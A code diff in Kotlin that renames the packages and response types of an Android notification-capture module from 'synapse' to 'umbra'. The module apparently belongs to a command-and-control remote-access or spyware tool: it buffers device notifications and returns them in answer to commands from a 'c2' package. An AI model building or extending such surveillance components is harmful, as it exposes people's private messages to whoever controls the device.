@@ -1,15 +1,15 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
-import org.synapse.core.c2.Command
-import org.synapse.core.core.NotificationEntry
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.NotificationEntry
+import org.umbra.core.core.UmbraResponse
 
 /**
  * NotificationListenerService-based notification capture.
- * Requires the user to enable Synapse Notification Listener in Settings.
+ * Requires the user to enable Umbra Notification Listener in Settings.
  * Notifications are buffered in-memory and returned on demand.
  */
 object NotificationModule {
@@ -44,7 +44,7 @@ object NotificationModule {
         }
     }
 
-    suspend fun list(context: Context, cmd: Command): SynapseResponse {
+    suspend fun list(context: Context, cmd: Command): UmbraResponse {
         val count = (cmd.params["count"]?.toIntOrNull() ?: 50).coerceAtMost(MAX_BUFFER)
         val packageFilter = cmd.params["package"]  // optional filter by package name
 
@@ -58,12 +58,12 @@ object NotificationModule {
                 filtered.take(count)
             }
 
-            SynapseResponse.NotificationsResponse(
+            UmbraResponse.NotificationsResponse(
                 notifications = results,
                 count = results.size
             )
         } catch (e: Exception) {
-            SynapseResponse.ErrorResponse("notifications:${e.message}", "notifications")
+            UmbraResponse.ErrorResponse("notifications:${e.message}", "notifications")
         }
     }
 }
